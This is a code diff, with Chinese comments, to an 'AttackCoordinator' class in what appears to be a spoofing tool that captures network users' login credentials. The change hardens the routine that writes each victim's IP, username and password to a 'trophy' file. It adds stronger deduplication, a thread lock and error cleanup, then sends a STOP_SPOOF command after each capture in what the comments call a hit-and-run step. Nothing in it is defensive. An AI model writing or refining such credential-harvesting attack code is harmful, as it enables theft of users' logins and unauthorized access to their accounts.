@@ -197,18 +197,32 @@ class AttackCoordinator:
     def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
         """保存捕获的凭据并触发立即撤离"""
         try:
-            # 防重复：检查是否已经保存过此用户的凭据
-            credential_key = f"{source_ip}:{credentials.get('username', '')}"
+            # ★【强化防重复】★ 多层去重检查
+            username = credentials.get('username', '')
+            password = credentials.get('password', '')
+            credential_key = f"{source_ip}:{username}:{password}"
             
             # 使用状态缓存检查是否已保存
             if self.state_cache.has_credentials_saved(credential_key):
                 self.logger.debug(f"Credentials for {credential_key} already saved, skipping duplicate")
                 return
             
+            # ★【新增】★ 线程安全的重复检查
+            with self.stats_lock:
+                if hasattr(self, '_saved_credentials_cache'):
+                    if credential_key in self._saved_credentials_cache:
+                        self.logger.debug(f"Credentials {credential_key} already in processing cache")
+                        return
+                else:
+                    self._saved_credentials_cache = set()
+                
+                # 标记正在处理
+                self._saved_credentials_cache.add(credential_key)
+            
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
             
             # 格式化保存内容：IP,用户名,密码,时间 (保持原始4字段格式)
-            log_entry = f"{source_ip},{credentials['username']},{credentials['password']},{timestamp}\n"
+            log_entry = f"{source_ip},{username},{password},{timestamp}\n"
             
             # 保存到临时文件
             trophy_file = "temporary.txt"
@@ -218,9 +232,9 @@ class AttackCoordinator:
             # 标记已保存，防止重复
             self.state_cache.mark_credentials_saved(credential_key)
             
-            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {credentials['username']}@{source_ip}")
+            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
             
-            # 🚀 新增：发送立即停止攻击命令 (一击脱离)
+            # 🚀 发送立即停止攻击命令 (一击脱离)
             stop_command = {
                 'type': 'STOP_SPOOF',
                 'target_ip': source_ip,
@@ -233,6 +247,10 @@ class AttackCoordinator:
             
         except Exception as e:
             self.logger.error(f"Failed to save credentials: {e}")
+            # 发生错误时从处理缓存中移除
+            with self.stats_lock:
+                if hasattr(self, '_saved_credentials_cache'):
+                    self._saved_credentials_cache.discard(credential_key)
     
     def get_statistics(self) -> Dict[str, Any]:
         """获取协调器统计信息"""
